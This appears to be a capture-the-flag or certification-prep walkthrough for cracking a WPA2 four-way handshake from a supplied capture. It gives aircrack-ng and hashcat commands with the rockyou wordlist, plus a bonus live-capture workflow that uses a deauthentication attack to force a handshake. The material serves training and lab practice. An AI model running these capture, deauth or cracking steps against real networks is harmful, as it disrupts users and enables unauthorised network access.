# Scenario 11 — WPA2 Handshake Capture and Crack

**Difficulty:** 🟡 | **Time:** ~20 min | **Domains:** 14 Wireless, 18 Crypto
**Tools:** [aircrack-ng](../../tools/aircrack-ng.md), [hashcat](../../tools/hashcat.md)

## Story
You're given `wifi.cap` containing a WPA2 4-way handshake for SSID `CorpNet`. Recover the Wi-Fi passphrase.

## Step 1 — Confirm the capture has a handshake
```bash
aircrack-ng wifi.cap
```
**Expected finding:** `1 handshake` next to `CorpNet`, BSSID listed.
**→ Tool ref:** [aircrack-ng](../../tools/aircrack-ng.md)

## Step 2 — Option A — aircrack with rockyou
```bash
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b <BSSID> wifi.cap
```
**Expected finding:** `KEY FOUND! [ password ]`.

## Step 3 — Option B — hashcat (much faster on GPU)
```bash
# Convert cap -> hccapx (or .hc22000 for modern hashcat)
hcxpcapngtool -o wifi.hc22000 wifi.cap
hashcat -m 22000 wifi.hc22000 /usr/share/wordlists/rockyou.txt
```
**Expected finding:** cracked PSK in hashcat potfile.
**→ Tool ref:** [hashcat -m 22000](../../tools/hashcat.md)

## Step 4 — Bonus — the capture workflow (if asked to capture yourself)
```bash
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon
sudo airodump-ng --bssid <AP> -c <CH> -w cap wlan0mon
# deauth to force handshake
sudo aireplay-ng -0 5 -a <AP> -c <CLIENT> wlan0mon
```

## Step 5 — Final answer
**Answer format:** the cleartext Wi-Fi passphrase.

## Gotchas across this chain
- Hashcat mode was `2500` (hccapx) — now `22000` (hc22000). The exam answer keys may still use 2500.
- You need *both* M1-M2 or M2-M3 frames — a "half handshake" won't crack.
- `rockyou.txt` is lowercase-heavy; try `-r best64.rule` to mutate.
- WPA PSKs are ≥8 chars — skip wordlist entries shorter than 8 with `--pw-min-len`.
- If `wifi.cap` is really a `.pcapng`, aircrack may complain — convert with `tshark -F pcap`.

## Variant questions this scenario teaches you to handle
- "What SSID does this capture target?" → step 1.
- "Convert this cap to hashcat format" → step 3.
- "Crack this WPA2 handshake" → steps 2 or 3.
- "Capture a handshake from AP X" → step 4.
